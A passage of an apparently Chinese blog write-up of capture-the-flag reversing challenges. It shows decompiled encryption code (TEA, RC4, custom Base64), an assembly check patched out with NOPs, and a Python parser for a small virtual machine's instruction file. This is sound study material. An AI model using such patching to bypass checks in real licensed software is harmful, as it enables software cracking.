v18[v640];</span><br><span class="line">    v1012++;</span><br><span class="line">    v586 = <span class="number">64</span>;</span><br><span class="line">    *(_BYTE *)v1012 = v18[v586];</span><br><span class="line">    v1012++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    v13 = *(_BYTE *)v1013;</span><br><span class="line">    v720 = (v13 &amp; <span class="number">3</span>) &lt;&lt; <span class="number">4</span>;</span><br><span class="line">    v14 = *(_BYTE *)(v1013 + <span class="number">1</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    *(_BYTE *)v1012 = v18[v720 | v14 &amp; <span class="number">0xf</span>];</span><br><span class="line">    v1012++;</span><br><span class="line">    v15 = *(<span class="keyword">unsigned</span> __int8 *)(v1013 + <span class="number">1</span>);</span><br><span class="line">    v666 = (v15 &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">2</span>;</span><br><span class="line">    *(_BYTE *)v1012 = v18[v666];</span><br><span class="line">    v1012++;</span><br><span class="line">  &#125;</span><br><span class="line">  v564 = <span class="number">8</span>;</span><br><span class="line">  v548 = <span class="number">8</span>;</span><br><span class="line">  v534 = v548;</span><br><span class="line">  v533 = v564;</span><br><span class="line">  v532 = <span class="number">64</span>;</span><br><span class="line">  *(_BYTE *)v1012 = (<span class="keyword">unsigned</span> __int8)v18[v532];</span><br><span class="line">  v1012++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个for循环是v18的生成，后面是个base64换表换成v18的</p><p>根据字符串提示，后面就是check了，但这部分好像反编译不出来</p><p>看了下汇编（patch前的忘记存了）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">07FF7D3CE9906                 lea     rcx, aWowThatIsAmazi ; &quot;Wow.....That is amazing.......You actua&quot;...</span><br><span class="line">.text:00007FF7D3CE990D                 call    print</span><br><span class="line">.text:00007FF7D3CE9912                 mov     [rbp+2A80h+var_14], 0</span><br><span class="line">.text:00007FF7D3CE991C                 jmp     loc_7FF7D3CE9A16</span><br><span class="line"></span><br><span class="line">.text:00007FF7D3CE9A16 loc_7FF7D3CE9A16:                       ; CODE XREF: sub_7FF7D3CE15E2+833A↑j</span><br><span class="line">.text:00007FF7D3CE9A16                 nop</span><br><span class="line">.text:00007FF7D3CE9A17                 nop</span><br><span class="line">.text:00007FF7D3CE9A18                 nop</span><br><span class="line">.text:00007FF7D3CE9A19                 nop</span><br><span class="line">.text:00007FF7D3CE9A1A                 nop</span><br><span class="line">.text:00007FF7D3CE9A1B                 nop</span><br><span class="line">.text:00007FF7D3CE9A1C                 nop</span><br><span class="line">.text:00007FF7D3CE9A1D                 nop</span><br><span class="line">.text:00007FF7D3CE9A1E                 nop</span><br><span class="line">.text:00007FF7D3CE9A1F                 nop</span><br><span class="line">.text:00007FF7D3CE9A20                 nop</span><br><span class="line">.text:00007FF7D3CE9A21                 nop</span><br><span class="line">.text:00007FF7D3CE9A22                 nop</span><br><span class="line">.text:00007FF7D3CE9A23                 nop</span><br><span class="line">.text:00007FF7D3CE9A24                 nop</span><br><span class="line">.text:00007FF7D3CE9A25                 nop</span><br><span class="line">.text:00007FF7D3CE9A26                 lea     rcx, aOkYouWinTheRes ; &quot;Ok you win. The result will be shown la&quot;...</span><br><span class="line">.text:00007FF7D3CE9A2D                 call    print</span><br><span class="line">.text:00007FF7D3CE9A32                 mov     [rbp+2A80h+var_18], 0</span><br><span class="line">.text:00007FF7D3CE9A3C                 jmp     loc_7FF7D3CE9B1A</span><br></pre></td></tr></table></figure><p>本来有一个判断和一个跳转，直接patch掉，中间应该是一些浪费时间的东西，再重新反编译一下，就能看到check部分了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">v1272 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v37 = <span class="number">49</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v1272 &gt;= v37 )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *((_BYTE *)v21 + v1272) != *((_BYTE *)off_7FF7D3D02010 + v1272) )</span><br><span class="line">  &#123;</span><br><span class="line">    print((__int64)<span class="string">&quot;No\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* 从内存中取出的数据</span></span><br><span class="line"><span class="comment">  unsigned char off_7FF7D3D02010[] =</span></span><br><span class="line"><span class="comment">  &#123;</span></span><br><span class="line"><span class="comment">      0x06, 0xAB, 0x05, 0x6A, 0xA0, 0x72, 0x71, 0x0D, 0x0A, 0x6F, </span></span><br><span class="line"><span class="comment">      0xAC, 0x15, 0x05, 0xA5, 0x76, 0x41, 0x0A, 0x77, 0x13, 0xD8, </span></span><br><span class="line"><span class="comment">      0x69, 0x03, 0x14, 0x78, 0xD5, 0xA8, 0x44, 0x0F, 0xA7, 0x76, </span></span><br><span class="line"><span class="comment">      0x05, 0xAA, 0xA4, 0x09, 0x69, 0xA7, 0x0B, 0x11, 0x15, 0x42, </span></span><br><span class="line"><span class="comment">      0x11, 0x72, 0x14, 0xAD, 0x00, 0x00, 0x00, 0x00</span></span><br><span class="line"><span class="comment">  &#125;;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  v1272 += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此全部分析完毕，依次进行了TEA，RC4和Base64，中间进行了密钥生成，最后做个反向进行解密即可。</p><h2 id="补充：静态分析while语句实现的加法运算"><a href="#补充：静态分析while语句实现的加法运算" class="headerlink" title="补充：静态分析while语句实现的加法运算"></a>补充：静态分析while语句实现的加法运算</h2><p>之前的分析其实是用python实现一遍，然后找规律得到的（毕竟为了速度），但还是应该稍微静态分析一下具体发生了什么事情</p><p>看的时候就感觉很像是数电中的加法器，还是用简单的例子分析一下（删去了没有用到的语句）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v1153 = ll &amp; <span class="number">1</span>;                  <span class="comment">// 判断结尾是否为1</span></span><br><span class="line">v1152 = ll ^ <span class="number">1</span>;                  <span class="comment">// 如果结尾是1，将其变为0</span></span><br><span class="line">                                 <span class="comment">// 如果结尾是0，将其变为1</span></span><br><span class="line"><span class="keyword">while</span> ( v1153 ) &#123;                <span class="comment">// 如果此前结尾为1，将会涉及到进位的问题，因此进入循环</span></span><br><span class="line">                                 <span class="comment">// 如果此前结尾为0，就没有进位的问题了，无需进入循环</span></span><br><span class="line">    v1150 = <span class="number">2</span> * v1153;           <span class="comment">// 将结尾左移1</span></span><br><span class="line">    v1153 = (<span class="number">2</span> * v1153) &amp; v1152; <span class="comment">// 与加法之后的结果再进行一次按位与，这个的目的是看接下来是否还需要进位</span></span><br><span class="line">    v1152 ^= v1150;              <span class="comment">// 进行无进位加法</span></span><br><span class="line">&#125;                                <span class="comment">// 什么时候不会产生进位的问题了，什么时候就可以退出循环了</span></span><br><span class="line">ll = v1152;</span><br></pre></td></tr></table></figure><p>简单的说，就是用异或运算作为无进位的加法，然后通过一个while循环来完成进位</p><h1 id="vs"><a href="#vs" class="headerlink" title="vs"></a>vs</h1><p>这道题就比赛的时候简单看了一下，逆向难度很低，从一个文件读取指令，另一个文件当作内存，vm指令其实不难，但文件中的指令很多，需要手写一个vm的分析代码。</p><p>写完之后发现行数略多，先手动分析找了找规律，然后写了个自动化脚本提取，生成python代码，直接拿flag。</p><h2 id="vm的解析脚本"><a href="#vm的解析脚本" class="headerlink" title="vm的解析脚本"></a>vm的解析脚本</h2><p><code>vmreader.py:</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">memory = [</span><br><span class="line">    <span class="number">0x0C</span>, <span class="number">0xF4</span>, <span class="number">0x5F</span>, <span class="number">0xE9</span>, <span class="number">0xF2</span>, <span class="number">0xE6</span>, <span class="number">0x87</span>, <span class="number">0x4C</span>, <span class="number">0x5E</span>, <span class="number">0x61</span>, <span class="number">0x11</span>, <span class="number">0x7B</span>, <span class="number">0xF0</span>, <span class="number">0x11</span>, <span class="number">0x7F</span>, <span class="number">0xB4</span>, <span class="number">0xB2</span>, <span class="number">0xEB</span>, <span class="number">0x65</span>, <span class="number">0xE2</span>, <span class="number">0x15</span>, <span class="number">0xC6</span>, <span class="number">0x8B</span>, <span class="number">0x02</span>, <span class="number">0x8C</span>, <span class="number">0xC1</span>, <span class="number">0x50</span>, <span class="number">0xD0</span>, <span class="number">0x0D</span>, <span class="number">0xA1</span>, <span class="number">0xCD</span>, <span class="number">0x3A</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OPCode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, code_len, code, arglen, pes_code</span>):</span></span><br><span class="line">        self.code_len = code_len</span><br><span class="line">        self.code = code</span><br><span class="line">        self.arglen = arglen</span><br><span class="line">        self.pes_code = pes_code</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reader</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, file</span>):</span></span><br><span class="line">        self.index = <span class="number">0</span></span><br><span class="line">        self.buf = <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">        self.length = <span class="built_in">len</span>(self.buf)</span><br><span class="line">        self.asm = []</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_asm</span>(<span class="params">self, asm: OPCode</span>):</span></span><br><span class="line">        self.asm.append(asm)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">global</span> cnt</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(self.buf) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> self.asm:</span><br><span class="line">                <span class="keyword">if</span> a.code(self.buf[:a.code_len]):</span><br><span class="line">                    <span class="comment"># self.output += a.pes_code</span></span><br><span class="line">                    op_code = self.buf[:a.code_len]</span><br><span class="line">                    self.buf = self.buf[a.code_len:]</span><br><span class="line">                    <span class="keyword">if</span> op_code == <span class="string">b&#x27;\xff\xff&#x27;</span> <span class="keyword">and</span> self.buf[<span class="number">1</span>] &gt; <span class="number">2</span>:</span><br><span class="line">                        <span class="built_in">print</span> (cnt, op_code)</span><br><span class="line">                        cnt += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    args = [_ <span class="keyword">for</span> _ <span class="keyword">in</span> self.buf[:a.arglen]]</span><br><span class="line">                    a.pes_code(op_code, args)</span><br><span class="line">                    self.buf = self.buf[a.arglen:]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (cnt, self.buf[<span class="number">0</span>])</span><br><span class="line">                cnt += <span class="number">1</span></span><br><span class="line">                self.buf = self.buf[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">basic_io_code</span>(<span class="params">op_code</span>):</span></span><br><span class="line">    <span class="keyword">if</span> op_code == <span class="string">b&#x27;\xFF\xFF&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">basic_io_op</span>(<span class="params">op_code, args</span>):</span></span><br><span class="line">    <span class="keyword">global</span> cnt</span><br><span class="line">    <span class="keyword">if</span> args[<span class="number">1</span>] == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> args[<span class="number">0</span>] &gt; <span class="number">0x20</span> <span class="keyword">and</span> args[<span class="number">0</span>] &lt; <span class="number">0x7f</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;%d print %c&#x27;</span> % (cnt, args[<span class="number">0</span>]))</span><br><span class="line">            cnt += <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;%d print \\x%02x&#x27;</span> % (cnt, args[<span class="number">0</span>]))</span><br><span class="line">            cnt += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> args[<span class="number">1</span>] == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;%d mem[%d] = &lt;input&gt;&#x27;</span> % (cnt, args[<span class="number">0</span>]))</span><br><span class="line">        cnt += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> args[<span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;%d exit(0)&#x27;</span> % cnt)</span><br><span class="line">        cnt += <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (op_code, args)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jmp_code</span>(<span class="params">op_code</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>.from_bytes(op_code, <span class="string">&#x27;little&#x27;</span>) &amp; <span class="number">0x8000</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jmp_op</span>(<span class="params">op_code, args</span>):</span></span><br><span class="line">    <span class="keyword">global</span> cnt</span><br><span class="line">    pc = <span class="built_in">int</span>.from_bytes(op_code, <span class="string">&#x27;little&#x27;</span>) </span><br><span class="line">    addr = pc &amp; <span class="number">0x1FF</span></span><br><span class="line">    <span class="keyword">if</span> (addr &gt;&gt; <span class="number">3</span>) &gt; <span class="number">31</span>:</span><br><span class="line">        <span class="keyword">if</span> (memory[(addr &gt;&gt; <span class="number">3</span>) - <span class="number">32</span>] &gt;&gt; (addr &amp; <span class="number">7</span>)) &amp; <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;<span class="subst">&#123;cnt&#125;</span> goto <span class="subst">&#123;cnt + ((pc &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x3f</span>)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;<span class="subst">&#123;cnt&#125;</span> nop&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;%d if ((mem[ %d ] &gt;&gt; %d ) &amp; 1) == 0&#x27;</span> % (cnt, addr &gt;&gt; <span class="number">3</span>, addr &amp; <span class="number">7</span>), <span class="string">f&#x27;goto <span class="subst">&#123;cnt+((pc &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x3f</span>)&#125;</span>&#x27;</span>)</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jmp2_code</span>(<span class="params">op_code</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>.from_bytes(op_code, <span class="string">&#x27;little&#x27;</span>) &amp; <span class="number">0x8000</span> != <span class="number">0</span> <span class="keyword">and</span> op_code != <span class="string">b&#x27;\xff\xff&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jmp2_op</span>(<span class="params">op_code, args</span>):</span></span><br><span class="line">    <span class="keyword">global</span> cnt</span><br><span class="line">    pc = <span class="built_in">int</span>.from_bytes(op_code, <span class="string">&#x27;little&#x27;</span>) </span><br><span class="line">    addr = pc &amp; <span class="number">0x1FF</span></span><br><span class="line">    <span class="keyword">if</span> (addr &gt;&gt; <span class="number">3</span>) &gt; <span class="number">31</span>:</span><br><span class="line">        <span class="keyword">if</span> (memory[(addr &gt;&gt; <span class="number">3</span>) - <span class="number">32</span>] &gt;&gt; (addr &amp; <span class="number">7</span>)) &amp; <span class="number">1</span> != <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;<span class="subst">&#123;cnt&#125;</span> goto <span class="subst">&#123;cnt + ((pc &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x3f</span>)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;<span class="subst">&#123;cnt&#125;</span> nop&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;%d if ((mem[ %d ] &gt;&gt; %d ) &amp; 1) != 0&#x27;</span> % (cnt, addr &gt;&gt; <span class="number">3</span>, addr &amp; <span class="number">7</span>), <span class="string">f&#x27;goto <span class="subst">&#123;cnt+((pc &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x3f</span>)&#125;</span>&#x27;</span>)</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">basic_io = OPCode(<span class="number">2</span>, basic_io_code, <span class="number">2</span>, basic_io_op)</span><br><span class="line">r = Reader(<span class="string">&#x27;program&#x27;</span>)</span><br><span class="line">jmp = OPCode(<span class="number">2</span>, jmp_code, <span class="number">0</span>, jmp_op)</span><br><span class="line">jmp2 = OPCode(<span class="number">2</span>, jmp2_code, <span class="number">0</span>, jmp2_op)</span><br><span class="line">r.add_asm(basic_io)</span><br><span class="line">r.add_asm(jmp)</span><br><span class="line">r.add_asm(jmp2)</span><br><span class="line">r.read()</span><br></pre></td></tr></table></figure><h2 id="分析指令"><a href="#分析指令" class="headerlink" title="分析指令"></a>分析指令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">0 print P</span><br><span class="line">2 print l</span><br><span class="line">4 print e</span><br><span class="line">6 print a</span><br><span class="line">8 print s</span><br><span class="line">10 print e</span><br><span class="line">12 print \x20</span><br><span class="line">14 print i</span><br><span class="line">16 print n</span><br><span class="line">18 print p</span><br><span class="line">20 print u</span><br><span class="line">22 print t</span><br><span class="line">24 print \x20</span><br><span class="line">26 print y</span><br><span class="line">28 print o</span><br><span class="line">30 print u</span><br><span class="line">32 print r</span><br><span class="line">34 print \x20</span><br><span class="line">36 print f</span><br><span class="line">38 print l</span><br><span class="line">40 print a</span><br><span class="line">42 print g</span><br><span class="line">44 print :</span><br><span class="line">46 print \x20</span><br><span class="line">48 mem[0] &#x3D; &lt;input&gt;</span><br><span class="line">50 mem[1] &#x3D; &lt;input&gt;</span><br><span class="line">52 mem[2] &#x3D; &lt;input&gt;</span><br><span class="line">54 mem[3] &#x3D; &lt;input&gt;</span><br><span class="line">56 mem[4] &#x3D; &lt;input&gt;</span><br><span class="line">58 mem[5] &#x3D; &lt;input&gt;</span><br><span class="line">60 mem[6] &#x3D; &lt;input&gt;</span><br><span class="line">62 mem[7] &#x3D; &lt;input&gt;</span><br><span class="line">64 mem[8] &#x3D; &lt;input&gt;</span><br><span class="line">66 mem[9] &#x3D; &lt;input&gt;</span><br><span class="line">68 mem[10] &#x3D; &lt;input&gt;</span><br><span class="line">70 mem[11] &#x3D; &lt;input&gt;</span><br><span class="line">72 mem[12] &#x3D; &lt;input&gt;</span><br><span class="line">74 mem[13] &#x3D; &lt;input&gt;</span><br><span class="line">76 mem[14] &#x3D; &lt;input&gt;</span><br><span class="line">78 mem[15] &#x3D; &lt;input&gt;</span><br><span class="line">80 mem[16] &#x3D; &lt;input&gt;</span><br><span class="line">82 mem[17] &#x3D; &lt;input&gt;</span><br><span class="line">84 mem[18] &#x3D; &lt;input&gt;</span><br><span class="line">86 mem[19] &#x3D; &lt;input&gt;</span><br><span class="line">88 mem[20] &#x3D; &lt;input&gt;</span><br><span class="line">90 mem[21] &#x3D; &lt;input&gt;</span><br><span class="line">92 mem[22] &#x3D; &lt;input&gt;</span><br><span class="line">94 mem[23] &#x3D; &lt;input&gt;</span><br><span class="line">96 mem[24] &#x3D; &lt;input&gt;</span><br><span class="line">98 mem[25] &#x3D; &lt;input&gt;</span><br><span class="line">100 mem[26] &#x3D; &lt;input&gt;</span><br><span class="line">102 mem[27] &#x3D; &lt;input&gt;</span><br><span class="line">104 mem[28] &#x3D; &lt;input&gt;</span><br><span class="line">106 mem[29] &#x3D; &lt;input&gt;</span><br><span class="line">108 mem[30] &#x3D; &lt;input&gt;</span><br><span class="line">110 mem[31] &#x3D; &lt;input&gt;</span><br></pre></td></tr></table></figure><p>这部分是简单的输出和输入，直接看二进制文件的字节也能看出来</p><p>然后是输入的判断部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">112 if ((mem[ 12 ] &gt;&gt; 5 ) &amp; 1) !&#x3D; 0 goto 125</span><br><span class="line">113 nop</span><br><span class="line">114 if ((mem[ 19 ] &gt;&gt; 2 ) &amp; 1) &#x3D;&#x3D; 0 goto 125</span><br><span class="line">115 print N</span><br><span class="line">117 print o</span><br><span class="line">119 print !</span><br><span class="line">121 print \x0a</span><br><span class="line">123 exit(0)</span><br><span class="line">125 goto 127</span><br><span class="line">126 if ((mem[ 22 ] &gt;&gt; 6 ) &amp; 1) !&#x3D; 0 goto 146</span><br><span class="line">127 goto 131</span><br><span class="line">128 if ((mem[ 1 ] &gt;&gt; 1 ) &amp; 1) !&#x3D; 0 goto 140</span><br><span class="line">129 if ((mem[ 0 ] &gt;&gt; 3 ) &amp; 1) !&#x3D; 0 goto 140</span><br><span class="line">130 b&#39;\xff\xff&#39;</span><br><span class="line">131 goto 133</span><br><span class="line">132 b&#39;\xff\xff&#39;</span><br><span class="line">133 if ((mem[ 30 ] &gt;&gt; 5 ) &amp; 1) &#x3D;&#x3D; 0 goto 146</span><br><span class="line">134 nop</span><br><span class="line">135 nop</span><br><span class="line">136 print N</span><br><span class="line">138 print o</span><br><span class="line">140 print !</span><br><span class="line">142 print \x0a</span><br><span class="line">144 exit(0)</span><br><span class="line">146 nop</span><br><span class="line">147 if ((mem[ 6 ] &gt;&gt; 4 ) &amp; 1) !&#x3D; 0 goto 169</span><br><span class="line">148 goto 150</span><br><span class="line">149 b&#39;\xff\xff&#39;</span><br><span class="line">150 goto 154</span><br><span class="line">151 if ((mem[ 0 ] &gt;&gt; 4 ) &amp; 1) &#x3D;&#x3D; 0 goto 163</span><br><span class="line">152 if ((mem[ 3 ] &gt;&gt; 0 ) &amp; 1) !&#x3D; 0 goto 163</span><br><span class="line">153 b&#39;\xff\xff&#39;</span><br><span class="line">154 if ((mem[ 8 ] &gt;&gt; 0 ) &amp; 1) &#x3D;&#x3D; 0 goto 169</span><br><span class="line">155 goto 159</span><br><span class="line">156 if ((mem[ 1 ] &gt;&gt; 0 ) &amp; 1) &#x3D;&#x3D; 0 goto 168</span><br><span class="line">157 if ((mem[ 1 ] 